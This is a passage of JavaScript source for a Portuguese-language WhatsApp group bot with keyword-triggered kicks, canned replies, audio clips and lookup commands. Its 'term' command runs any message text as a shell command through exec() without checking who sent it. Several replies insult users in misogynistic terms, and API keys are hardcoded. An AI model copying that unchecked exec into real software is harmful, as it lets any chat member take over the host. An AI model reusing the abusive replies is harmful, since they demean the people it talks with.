			client.updatePresence(from, Presence.composing)
		}, 40000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
		}, 30000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
		}, 20000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
		}, 10000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Teste concluído")
		}, 0)
	}
	
	        if (messagesC.includes("macaco")){
		if (!isGroup) return
		if (!isAntiRacismo) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("1 segundo")
		}, 4000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
		}, 0)
	}
	
	        if (messagesC.includes("pretoimundo")){
		if (!isGroup) return
		if (!isAntiRacismo) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("1 segundo")
		}, 4000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
		}, 0)
	}
	
        if (messagesC.includes("viado")){
		if (!isGroup) return
		if (!isAntiHomofobia) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau fdp ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Nesse grupo, não gostamos de homofobia, que isso sirva de exemplo 🚶")
		}, 4000)
	}
	     	
        if (messagesC.includes("baitola")){
		if (!isGroup) return
		if (!isAntiHomofobia) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau fdp ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Nesse grupo, não gostamos de homofobia, que isso sirva de exemplo 🚶")
		}, 4000)
	}
	
        if (messagesC.includes("gaynojento")){
		if (!isGroup) return
		if (!isAntiHomofobia) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau fdp ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Nesse grupo, não gostamos de homofobia, que isso sirva de exemplo 🚶")
		}, 4000)
	}
	
        if (messagesC.includes("viadinho")){
		if (!isGroup) return
		if (!isAntiHomofobia) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau fdp ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Nesse grupo, não gostamos de homofobia, que isso sirva de exemplo 🚶")
		}, 4000)
	}
						     			     				     			     	
        if (messagesC.includes("odeiolgbt")){
		if (!isGroup) return
		if (!isAntiHomofobia) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau fdp ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Nesse grupo, não gostamos de homofobia, que isso sirva de exemplo 🚶")
		}, 4000)
	}

        if (messagesC.includes("odeiogay")){
		if (!isGroup) return
		if (!isAntiHomofobia) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau fdp ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("Nesse grupo, não gostamos de homofobia, que isso sirva de exemplo 🚶")
		}, 4000)
	}	
			     			     				     			 	
	   if (messagesC.includes(".meuid")){
	   client.updatePresence(from, Presence.composing)
      client.sendMessage(from, trujuh, MessageType.text);
      client.sendMessage(from, MessageType + " / " + messageType, MessageType.text);
   }
	
	        if (messagesC.includes("pq vc e preto")){
		if (!isGroup) return
		if (!isAntiRacismo) return
		if (isGroupAdmins) return reply('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
		client.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo em 5 segundos`)
		setTimeout( () => {
			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 5000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("1 segundo")
		}, 4000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("2 segundos")
		}, 3000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("3 segundos")
		}, 2000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("4 segundos")
		}, 1000)
		setTimeout( () => {
			client.updatePresence(from, Presence.composing)
			reply("5 segundo KKKKKKKK tchau otário 😔🤙")
		}, 0)
	}
	
       if (messagesC.includes("://chat.whatsapp.com/")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*Você é admin, nao irei te banir, fica suave.*`)
		client.updatePresence(from, Presence.composing)
		var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply('tchau👋')
		}, 1100)
		setTimeout( () => {
		client.groupRemove(from, [Kick]).catch((e) => {reply(`*ERROR:* ${e}`)}) 
					}, 1000)
		setTimeout( () => {
		reply(`link detectado você vai ser expulso`)
		}, 0)
		}
	
//INTERAÇÃO

  //Info convid
if (text.includes('.Covid')){
client.sendMessage(id, 'Por favor, repita o comando em minúsculas',MessageType.text, { quoted: m } );
}
if (text.includes(".covid"))
   {
const get = require('got')
    const body = await get.post('https://api.kawalcorona.com/indonesia', {
    }).json();
    var positif = (body[0]['positif']);
    var sembuh  = (body[0]['sembuh']);
    var meninggal = (body[0]['meninggal']);
    var dirawat = (body[0]['dirawat']);
    console.log(body[0]['name'])
    client.sendMessage(id,`📌ÚLTIMOS DADOS DO DISTRITO COVID-19 DA INDONÉSIA\n\n*Positif* = ${positif} \n*Sembuh* = ${sembuh} \n*Meninggal* = ${meninggal}\n*Dirawat* = ${dirawat}\n\n*Stay safe dan selalu gunakan masker saat berpergian*`, MessageType.text, { quoted: m } );
}
	
	if (messagesC.includes("fdp")){
			client.updatePresence(from, Presence.composing)
			reply("teu pai")
	}
	
		if (messagesC.includes("kkkkkk")){
			client.updatePresence(from, Presence.composing)
			reply("kskskskk")
	}
	
			if (messagesC.includes("lixo")){
			client.updatePresence(from, Presence.composing)
			reply("por acaso eu sou vc agr?")
	}
	
				if (messagesC.includes("lindo")){
			client.updatePresence(from, Presence.composing)
			reply("obgd meu amor")
	}
	
				if (messagesC.includes("fcc")){
			client.updatePresence(from, Presence.composing)
			reply("ainda existe isso? KKKKKKKKK")
	}
	
			if (messagesC.includes("but")){
			client.updatePresence(from, Presence.composing)
			reply("é bot seu analfabeto")
	}
	
				if (messagesC.includes("mo")){
			client.updatePresence(from, Presence.composing)
			reply("oii mb, falou cmg? 🥺")
	}
	
			if (messagesC.includes("olaf")){
			client.updatePresence(from, Presence.composing)
			reply("oiii")
	}
	
			if (messagesC.includes("bem?")){
			client.updatePresence(from, Presence.composing)
			reply("to bem, vlw por perguntar 😏")
	}
	
				if (messagesC.includes("!help")){
			client.updatePresence(from, Presence.composing)
			reply("É com . caralho")
	}
	
					if (messagesC.includes("!menu")){
			client.updatePresence(from, Presence.composing)
			reply("É com . caralho")
	}
	
					if (messagesC.includes("#help")){
			client.updatePresence(from, Presence.composing)
			reply("É com . caralho")
	}
	
					if (messagesC.includes("#menu")){
			client.updatePresence(from, Presence.composing)
			reply("É com . caralho")
	}
	
			if (messagesC.includes("chato")){
			client.updatePresence(from, Presence.composing)
			reply("nossa 🥺")
	}

			if (messagesC.includes("vadia")){
			client.updatePresence(from, Presence.composing)
			reply("ai mano, vc acha legal usar um argumento machista?")
	}
	
			if (messagesC.includes("maria")){
			client.updatePresence(from, Presence.composing)
			reply("amo ela")
	}
	
		if (messagesC.includes("corno")){
			client.updatePresence(from, Presence.composing)
			reply("vsfd seu merda")
	}
	
		if (messagesC.includes("tmnc")){
			client.updatePresence(from, Presence.composing)
			reply("vai vc, tu ja me disse q é mo bom")
	}
	
		if (messagesC.includes("vsfd")){
			client.updatePresence(from, Presence.composing)
			reply("bora juntos?")
	}
	
		if (messagesC.includes("cadebot")){
			client.updatePresence(from, Presence.composing)
			reply("olha eu aqui carai")
	}
	
		if (messagesC.includes("bot")){
			client.updatePresence(from, Presence.composing)
			reply("oi")
	}
	
			if (messagesC.includes("bah")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/fdp.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}

			if (messagesC.includes("bomdia")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/bomdia.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}

			if (messagesC.includes("puta")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/puta.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}

			if (messagesC.includes("gado")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/gado.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}

			if (messagesC.includes("delicia")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/delicia.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}

			if (messagesC.includes("boatarde")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/boatarde.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
		
			  if (messagesC.includes("olaf")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/olaf.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
			  if (messagesC.includes("aham")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/aham.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}			
			 if (messagesC.includes("kong")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/kong.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
            if (messagesC.includes("susto")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/susto.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
		     if (messagesC.includes("bate")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/bate.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}

			  if (messagesC.includes("pretende?")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/pretende?.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}																																																								
				if (messagesC.includes("oii")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/ola.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
//msc
	
					if (messagesC.includes("hylander")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/hylander.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("cmflamengo")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/cmflamengo.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("cmgremio")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/cmgremio.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("m4")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/m4.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("macaverde")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/macaverde.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("kalidade")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/kalidade.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
						if (messagesC.includes("nikeb")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/nikeb.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
			if (messagesC.includes("banhodeleite")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/BanhoDeLeite.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
				if (messagesC.includes("akdoflamengo")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/akdoflamengo.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
					if (messagesC.includes("nemo")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/nemo.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
			if (messagesC.includes("canta")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/canto.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
				if (messagesC.includes("canta")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/canto.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
			if (messagesC.includes("video")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/laranjinha.mp4');
            client.sendMessage(from, tujuh, video, {quoted: mek, mimetype: 'video/mp4', ptt:true})

	}
	
//msc fim
	
					if (messagesC.includes("grita")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/a.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
			if (messagesC.includes("bv")){
			client.updatePresence(from, Presence.composing)
			tujuh = fs.readFileSync('./assets/bv.mp3');
            client.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
	}
	
				if (messagesC.includes("digita")){
			client.updatePresence(from, Presence.composing)
            tod = await getBuffer(`https://i.yGKwBW1.jpg`)
            client.sendMessage(from, tod, image, { quoted: mek, caption: 'Voce chama isso de machismo?? sua puta.'})                  
	}
	
					if (messagesC.includes("machista")){
			client.updatePresence(from, Presence.composing)
            tod = await getBuffer(`https://i.imgur.com/yGKwBW1.jpg`)
            client.sendMessage(from, tod, image, { quoted: mek, caption: 'Voce chama isso de machismo?? sua puta.'})                  
	}
	
				if (messagesC.includes("mandememe")){
			client.updatePresence(from, Presence.composing)
			data = fs.readFileSync('./src/darkjokes.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                sendImage(hasil, mek, '*GELAP BOS :V*')
	}

				if (messagesC.includes("fotosolaf")){
			client.updatePresence(from, Presence.composing)
			data = fs.readFileSync('./src/olafofc.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                sendImage(hasil, mek, '*GELAP BOS :V*')
	}

				if (messagesC.includes("fotosay")){
			client.updatePresence(from, Presence.composing)
			data = fs.readFileSync('./src/say.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                sendImage(hasil, mek, '*GELAP BOS :V*')
	}		
        	colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			let authorname = client.contacts[from] != undefined ? client.contacts[from].vname || client.contacts[from].notify : undefined	
			if (authorname != undefined) { } else { authorname = groupName }	
 	    
            function addMetadata(packname, author) {	// by Mhankbarbar
				if (!packname) packname = 'made by admin'; if (!author) author = 'made by admin';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./stickers/${name}.exif`)) return `./stickers/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

				let len = JSON.stringify(json).length	
				let last	

				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	

				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	

				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	

				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

				fs.writeFile(`./stickers/${name}.exif`, buffer, (err) => {	
					return `./stickers/${name}.exif`	
				})	

			}
			switch(command) {
				case 'regras':
				case 'regras':
					client.sendMessage(from, regras(prefix), text)
					break
				case 'jogadorn1':
				case 'jogadorn1':
					client.sendMessage(from, jogadorn1(prefix), text)
					break
				case 'harrypotter1':
				case 'harrypotter1':
					client.sendMessage(from, harrypotter1(prefix), text)
					break
				case 'kaifuku':
				case 'kaifuku':
					client.sendMessage(from, kaifuku(prefix), text)
					break
				case 'filmes':
				case 'filmes':
					client.sendMessage(from, filmes(prefix), text)
					break
				case 'café':
				case 'café':
					client.sendMessage(from, café(prefix), text)
					break
				case 'jogar':
				case 'jogar':
					client.sendMessage(from, jogar(prefix), text)
					break
				case 'família':
				case 'família':
					client.sendMessage(from, família(prefix), text)
					break
				case 'sacana':
				case 'sacana':
					client.sendMessage(from, sacana(prefix), text)
					break
				case 'sacana1':
				case 'sacana1':
					client.sendMessage(from, sacana1(prefix), text)
					break
				case 'sacana2':
				case 'sacana2':
					client.sendMessage(from, sacana2(prefix), text)
					break
				case 'sacana3':
				case 'sacana3':
					client.sendMessage(from, sacana3(prefix), text)
					break
				case 'sacana4':
				case 'sacana4':
					client.sendMessage(from, sacana4(prefix), text)
					break
				case 'sacana5':
				case 'sacana5':
					client.sendMessage(from, sacana5(prefix), text)
					break
				case 'sacana6':
				case 'sacana6':
					client.sendMessage(from, sacana6(prefix), text)
					break
				case 'msc':
				case 'msc':
					client.sendMessage(from, msc(prefix), text)
					break
            	case 'mushoku':
				case 'mushoku':
					client.sendMessage(from, mushoku(prefix), text)
					break
            	case 'onepiece':
				case 'onepiece':
					client.sendMessage(from, onepiece(prefix), text)
					break
                case 'insta1':
				case 'insta1':
					client.sendMessage(from, insta1(prefix), text)
					break
                case 'lucifer':
				case 'lucifer':
					client.sendMessage(from, lucifer(prefix), text)
					break
                case 'exorcist':
				case 'exorcist':
					client.sendMessage(from, exorcist(prefix), text)
					break
                case 'nanatsu':
				case 'nanatsu':
					client.sendMessage(from, nanatsu(prefix), text)
					break
                case 'animes':
				case 'animes':
					client.sendMessage(from, animes(prefix), text)
					break
                case 'séries':
				case 'séries':
					client.sendMessage(from, séries(prefix), text)
					break
					case 'kiss':
				    try {    
					
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=BotWeA`, {method: 'get'})
						bufferv = await getBuffer(res.result)
						client.sendMessage(from, bufferv, image, {quoted: mek, caption: 'ezzzz'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						sa = await getBuffer(`https://i.ibb.co/JcSjmNY/IMG-20210107-WA0052.jpg`)
						client.sendMessage(from, sa, image, {quoted: mek, caption: 'Erro como!!'})
						reply('❌ *ERRO* ❌')
					}
					break
					case 'lista':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply('Você quem é o proprietário?')
					if (args.length < 1) return reply('Onde está o texto, irmão?')
					reply(mess.wait)
					client.sendMessage(from, 'Adicionando mensagem à lista com sucesso' , text, { quoted: mek })
					client.sendMessage(from, addsay(prefix), text, { quoted: mek })
					break
					case 'addsay':
				    hai = body.slice(8)
						sayrandom.push(hai)
						fs.writeFileSync('./src/say.json', JSON.stringify(sayrandom))
						reply(`Sucesso, Disse ${hai} Adicionado ao banco de dados`)
						break
				case 'term':
				const cmd = body.slice(4)
				exec(cmd, (err, stdout) => {
					if (err) return client.sendMessage(from, `root@${root}:~ ${err}`, text, { quoted: mek })
					if (stdout) {
						client.sendMessage(from, stdout, text)
					}
				})
				break
			case 'online': 
				if (!isGroupAdmins) return reply(mess.only.admin)
        		let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
			    let online = [...Object.keys(client.chats.get(ido).presences), client.user.jid]
			    client.sendMessage(from, 'Lista de onlines do grupo:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: mek,
  			  contextInfo: { mentionedJid: online }
			    })
				break 
                   case 'saylist':
					teks = 'Esta é a lista de dizeres :\n'
					for (let awokwkwk of sayrandom) {
						teks += `${line2} ${awokwkwk}\n`
					}
					teks += `Total : ${sayrandom.length}`
					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": sayrandom}})
					break
				case 'ssweb':
					if (args.length < 1) return reply('Cadê o url mano?')
					teks = `${body.slice(7)}`
					reply('espera')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/screenshotweb?url=${teks}`)
					ssweb = await getBuffer(anu.gambar)
					client.sendMessage(from, ssweb, image, {quoted: mek})
					await limitAdd(sender)
					break 		
//codando apis 🙏😍		
				case 'istalk':
				
					if (args.length < 1) return reply('Cadê o username tio')
					teks = body.slice(7)
					reply(mess.wait)
				    data = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=apivinz&q=${teks}`)
		            anuk = await getBuffer(data.result.profile_pic)
                    dark = `➳ NOME DE USUÁRIO: ${data.username}\n➳ NOME COMPLETO: ${data.full_name}\n➳ PRIVADO?: ${data.private_user}\n➳ TEM VERIFICADO?: ${data.verified_user}`
					client.sendMessage(from, anuk, image, {quoted: mek, caption: dark})
                    await limitAdd(sender)
					break
			    case 'istalk2':
					if (args.length < 1) return reply('cade o username burro kkkj!')
					darko = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=apivinz&q=${darko}`, {method: 'get'})
					buffer = await getBuffer(anu.result.profile_pic)
					capt = `➳ NOME DE USUÁRIO: ${anu.result.username}\n➳ NOME COMPLETO: ${anu.result.full_name}\n➳ PRIVADO?: ${anu.result.private_user}\n➳ TEM VERIFICADO?: ${anu.result.verified_user}`
					client.sendMessage(from, buffer, image, {quoted: mek, caption: capt})
					break
                case 'ytkomen':
					if (args.length < 1) return reply('Cadê o texto tio?')
					gh = body.slice(9)
					usnm = gh.split("|")[0];
					cmn = gh.split("|")[1];
					var imgbb = require('imgbb-uploader')
					ghost = mek.participant
					try {
					pp = await client.getProfilePicture(ghost)
					} catch {
					pp = 'https://i.ibb.co/64dN6bQ/IMG-20201220-WA0024.jpg'
					}
					media = await getBuffer(pp)
					datae = await imageToBase64(JSON.stringify(pp).replace(/\"/gi, ''))
					fs.writeFileSync('getpp.jpeg', datae, 'base64')
					res = await imgbb("727e7e43f6cda1dfb85d888522fd4ce1", 'getpp.jpeg')
					buffer88 = await getBuffer(`https://some-random-api.ml/canvas/youtube-comment?avatar=${res.display_url}&comment=${cmn}&username=${usnm}`)
					client.sendMessage(from, buffer88, image, {quoted: mek, caption: `*${usnm}* : ${cmn}`})
					break
				case 'walpaperhd':
				
					if (args.length < 1) return reply('Cadê o texto tio')
					teksj = body.slice(7)
					reply(mess.wait)
					anwu = await fetchJson(`https://api.vhtear.com/walpaper?query=${teksj}&apikey={BELI APIKEY BIAR WORK DI 0816546638}`, {method: 'get'})
					bufferx = await getBuffer(anwu.result.LinkImg)
					client.sendMessage(from, bufferx, image, {quoted: mek})
					break
					case 'jadian':

                    if (!isGroup) return reply(from, 'este comando só pode ser usado dentro do grupo', id)

                    const up = groupMembers

                    const aku = up[Math.floor(Math.random() * up.length)];

                    const kamu = up[Math.floor(Math.random() * up.length)];

                    const sapa = `Cieee... @${(/[@c.us]/g, '')} (💘) @${(/[@c.us]/g, '')} acabei de te inventar\nPor favor, compartilhe o pj`

                    client.sendMessage(from, sapa)

                    break
				case 'ramaljadian':
				
					var gh7 = body.slice(10)
